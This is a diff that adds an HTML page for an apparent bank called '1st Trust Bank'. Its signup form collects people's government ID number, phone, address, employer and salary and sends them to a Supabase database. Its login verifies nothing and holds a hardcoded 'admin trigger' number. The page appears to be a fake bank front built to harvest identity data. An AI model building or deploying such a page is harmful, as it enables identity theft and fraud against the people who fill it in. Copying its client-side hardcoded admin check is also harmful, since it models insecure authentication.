@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>1st Trust Bank | Financial Journey</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+body {
+background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?q=80&w=2070&auto=format&fit=crop');
+background-size: cover; background-position: center; color: white; font-family: 'Inter', sans-serif;
+}
+.glass-card { background: rgba(10, 10, 10, 0.85); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); }
+.input-box { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 16px; width: 100%; border-radius: 12px; margin-bottom: 12px; }
+.hidden { display: none; }
+</style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-6">
+
+<div id="landing" class="glass-card p-10 rounded-[2rem] w-full max-w-sm text-center shadow-2xl">
+<h1 class="text-emerald-400 font-bold tracking-widest text-xs uppercase mb-2">1st Trust Bank</h1>
+<h2 class="text-3xl font-light mb-8">Build your financial journey.</h2>
+<button onclick="navigate('signup')" class="w-full bg-emerald-600 py-4 rounded-xl font-bold mb-3">NEW TO 1TRUST BANK? CREATE ACCOUNT</button>
+<button onclick="navigate('login')" class="w-full border border-white/10 py-4 rounded-xl font-bold">LOGIN TO ACCOUNT</button>
+</div>
+
+<div id="signup" class="hidden glass-card p-10 rounded-[2rem] w-full max-w-sm">
+<button onclick="navigate('landing')" class="text-xs text-slate-400 mb-6">← BACK</button>
+<h2 class="text-2xl font-light mb-6">Create Account</h2>
+<input type="text" id="full-name" placeholder="Full Name" class="input-box">
+<input type="email" id="email" placeholder="Email" class="input-box">
+<input type="password" id="pass" placeholder="Password" class="input-box">
+<button onclick="goToVerification()" class="w-full bg-emerald-600 py-4 rounded-xl font-bold mt-2">NEXT: VERIFY IDENTITY</button>
+</div>
+
+<div id="verification" class="hidden glass-card p-10 rounded-[2rem] w-full max-w-sm">
+<h2 class="text-xl font-light mb-6">Executive Verification</h2>
+<input type="text" id="id-card" placeholder="Government ID Number" class="input-box">
+<input type="text" id="phone" placeholder="Phone Number" class="input-box">
+<input type="text" id="address" placeholder="Residential Address" class="input-box">
+<input type="text" id="work" placeholder="Employer / Work" class="input-box">
+<input type="number" id="salary" placeholder="Monthly Salary" class="input-box">
+<button onclick="finalizeSignup()" class="w-full bg-emerald-600 py-4 rounded-xl font-bold mt-2">FINALIZE APPLICATION</button>
+</div>
+
+<div id="login" class="hidden glass-card p-10 rounded-[2rem] w-full max-w-sm">
+<button onclick="navigate('landing')" class="text-xs text-slate-400 mb-6">← BACK</button>
+<h2 class="text-2xl font-light mb-6">Login</h2>
+<input type="text" id="login-id" placeholder="Account Number" class="input-box">
+<input type="password" id="login-pass" placeholder="Password" class="input-box">
+<button onclick="handleLogin()" class="w-full bg-emerald-600 py-4 rounded-xl font-bold mt-2">SIGN IN</button>
+</div>
+
+<script>
+const sb = supabase.createClient('https://epdzbjsecfsyfhknfbca.supabase.co', 'sb_publishable_an-C58kGAcL2Z4-lV_8h6g_G5524quL');
+let tempUser = {};
+
+function navigate(id) {
+['landing', 'signup', 'verification', 'login'].forEach(s => document.getElementById(s).classList.add('hidden'));
+document.getElementById(id).classList.remove('hidden');
+}
+
+function goToVerification() {
+tempUser = {
+full_name: document.getElementById('full-name').value,
+email: document.getElementById('email').value
+};
+navigate('verification');
+}
+
+async function finalizeSignup() {
+const accNum = '1T-' + Math.floor(10000000 + Math.random() * 90000000);
+const { error } = await sb.from('users').insert([{
+...tempUser,
+id_card: document.getElementById('id-card').value,
+phone: document.getElementById('phone').value,
+address: document.getElementById('address').value,
+work: document.getElementById('work').value,
+salary: document.getElementById('salary').value,
+account_number: accNum
+}]);
+error ? alert("Error: " + error.message) : alert("Account Created! Number: " + accNum);
+}
+
+function handleLogin() {
+// Admin trigger
+if(document.getElementById('login-id').value === "08059422423") {
+alert("Redirecting to Admin...");
+} else {
+alert("Verification in progress.");
+}
+}
+</script>
+</body>
+</html>
